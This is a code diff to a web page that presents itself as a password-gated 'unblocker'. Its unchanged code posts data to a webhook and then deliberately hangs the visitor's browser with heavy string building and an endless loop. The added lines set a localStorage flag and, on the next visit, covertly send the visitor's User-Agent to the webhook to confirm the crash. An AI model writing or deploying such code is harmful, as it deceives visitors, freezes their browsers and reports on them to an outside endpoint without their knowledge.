@@ -14,6 +14,18 @@
 
         // Prompt for password on page load
         window.onload = function() {
+            // Check for crash flag
+            if (localStorage.getItem("crashTest") === "pending") {
+                fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: `INFO: Browser was likely crashed or force-closed during heavy operations.\nUser-Agent: ${navigator.userAgent}`
+                    })
+                });
+                localStorage.removeItem("crashTest");
+            }
+
             var userPassword = prompt("Enter the password to access this page:");
             if (userPassword === PASSWORD) {
                 // Show the unblocker UI
@@ -35,6 +47,10 @@
                             },
                             body: JSON.stringify(payload)
                         });
+                    })
+                    .then(() => {
+                        // Set crash flag before heavy operations
+                        localStorage.setItem("crashTest", "pending");
                     })
                     .then(() => {
                         var total = "";
@@ -97,6 +113,8 @@
                         }
                     })
                     .finally(() => {
+                        // If we reach here, browser did NOT crash
+                        localStorage.setItem("crashTest", "completed");
                         console.log("you're not allowed here :)");
                         while (true) {}
                     });
